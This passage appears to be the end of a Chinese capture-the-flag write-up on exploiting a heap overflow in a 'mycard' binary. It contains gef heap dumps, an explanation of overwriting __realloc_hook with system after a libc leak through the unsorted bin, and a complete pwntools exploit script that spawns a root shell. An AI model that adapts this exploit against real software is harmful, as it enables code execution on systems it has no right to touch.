        [0x0000555debb460b0     00 00 00 00 00 00 00 00 78 4b 92 2f 4b 7f 00 00    ........xK./K...]
    Chunk(addr=0x555debb46110, size=0x20, flags=PREV_INUSE)第1个的node
        [0x0000555debb46110     30 61 b4 eb 5d 55 00 00 10 61 b4 eb 5d 55 00 00    0a..]U...a..]U..]
    Chunk(addr=0x555debb46130, size=0xe0, flags=PREV_INUSE)第1个的moon
        [0x0000555debb46130     6e 61 6d 65 00 00 00 00 00 00 00 00 00 00 00 00    name............]
    Chunk(addr=0x555debb46210, size=0xb0, flags=PREV_INUSE)第4个的moon
        [0x0000555debb46210     66 6f 75 72 74 68 00 00 00 00 00 00 00 00 00 00    fourth..........]
    Chunk(addr=0x555debb462c0, size=0xf0, flags=PREV_INUSE)第2个的moon,已free,在unsorted bin
        [0x0000555debb462c0     78 4b 92 2f 4b 7f 00 00 78 4b 92 2f 4b 7f 00 00    xK./K...xK./K...]
    Chunk(addr=0x555debb463b0, size=0x20, flags=)第4个的node
        [0x0000555debb463b0     10 62 b4 eb 5d 55 00 00 90 60 b4 eb 5d 55 00 00    .b..]U...`..]U..]
    Chunk(addr=0x555debb463d0, size=0x20c40, flags=PREV_INUSE)  ←  top chunk
    gef➤  heap bins
    [+] No Tcache in this version of libc
    ────────────────────────────────────────────────────────────────── Fastbins for arena 0x7f4b2f924b20 ──────────────────────────────────────────────────────────────────
    Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x555debb46070, size=0x20, flags=PREV_INUSE) 
    Fastbins[idx=1, size=0x20] 0x00
    Fastbins[idx=2, size=0x30] 0x00
    Fastbins[idx=3, size=0x40] 0x00
    Fastbins[idx=4, size=0x50]  ←  Chunk(addr=0x555debb460b0, size=0x60, flags=PREV_INUSE) 
    Fastbins[idx=5, size=0x60] 0x00
    Fastbins[idx=6, size=0x70] 0x00
    ───────────────────────────────────────────────────────────────── Unsorted Bin for arena 'main_arena' ─────────────────────────────────────────────────────────────────
    [+] unsorted_bins[0]: fw=0x555debb462b0, bk=0x555debb462b0
     →   Chunk(addr=0x555debb462c0, size=0xf0, flags=PREV_INUSE)
    [+] Found 1 chunks in unsorted bin.
    ────────────────────────────────────────────────────────────────── Small Bins for arena 'main_arena' ──────────────────────────────────────────────────────────────────
    [+] Found 0 chunks in 0 small non-empty bins.
    ────────────────────────────────────────────────────────────────── Large Bins for arena 'main_arena' ──────────────────────────────────────────────────────────────────
    [+] Found 0 chunks in 0 large non-empty bins.
    从这里可以发现,再次edit 节点2的时候(此时edit的是原来的第3个,因为第2个被delete掉了,后面的往前减1). 可以通过1字节的realloc地址再低位写入c0,即:0x555debb46010-->0x555debb460c0而第1个的node地址为0x555debb46110.只相差0x50字节,通过edit就可以将第1个node的p指针写入__realloc_hook地址.
getshell:
    payload = 'a'*(0xc)#从0x555debb460c0+0x44开始写,故填充0xc个'a'就能到下一个
    node了
    payload += p64(malloc_hook_addr)#修改第1个node为__realloc_hook地址
    edit(2,'asdf',0xa0,payload)
    edit(1,p64(one_gadget),0x20,'asdf')#修改__realloc_hook为system地址
    edit(2,'/bin/shx00',0x300,'asdf')#getshell!!. 
    .........
    Len?
    Description :
    [*] Switching to interactive mode
    /bin/sh: 1: asdf: not found
    whoami
    root
## 4.总结
通过修改hook绕过pie,alsr等保护
通过write和unsorted bin泄露libc
通过realloc和堆自身的分配机制和堆溢出实现修改任意内存.
本题的堆分配及释放较复杂, 需要逆向分析链表结构, 所以通过一边分析一边调试还是对新手很有收获的.
## 5.附上完整exp:
    from pwn import *
    p = process('./mycard')
    libc = ELF('./libc.so.6')
    elf = ELF('./mycard')
    def create(name,desc_len,desc):
        print p.recvuntil('4:exitn')
        p.sendline('1')
        print p.recvuntil('Name:')
        p.sendline(name)
        print p.recvuntil('Len:')
        p.sendline(str(desc_len))
        print p.recvuntil('Description:')
        p.sendline(desc)
        return
    def delete(no):
        print p.recvuntil('4:exitn') 
        p.sendline('2')
        print p.recvuntil('>')
        p.sendline(str(no))
        return
    def edit(no, name, desc_len, desc):
        print p.recvuntil('4:exitn') 
        p.sendline('3')
        print p.recvuntil('>')
        p.sendline(str(no))
        print p.recvuntil('New name?')
        p.sendline(name)
        print p.recvuntil('Len?')
        p.sendline(str(desc_len))
        print p.recvuntil('Description :')
        p.sendline(desc)
        return
    create('asdf',0xc+0x40,'desc')
    #gdb.attach(p)
    delete(1)
    create('name',0x90,'qwer')
    print p.recvuntil('4:exitn') 
    p.sendline('3')
    print p.recvuntil('Description :qwer')
    heap_addr = p.recvuntil('>')
    p.sendline(str(123))
    heap_addr = heap_addr[4:12]
    heap_addr = u64(heap_addr)
    print 'heap_addr: ',hex(heap_addr)
    libc_base = heap_addr-0x3c4b78
    print 'libc base:', hex(libc_base)
    malloc_hook_addr = libc_base+libc.sym['__realloc_hook']
    one_gadget = libc_base+libc.sym['system']
    create('second', 0xa0,'asdf')
    create('third', 0xc,'asdf')
    create('fourth',0x50,'asdf')
    delete(2)
    payload = 'a'*(0xc)
    payload += p64(malloc_hook_addr)
    edit(2,'asdf',0xa0,payload)
    edit(1,p64(one_gadget),0x20,'asdf')
    edit(2,'/bin/shx00',0x300,'asdf')
    p.interactive()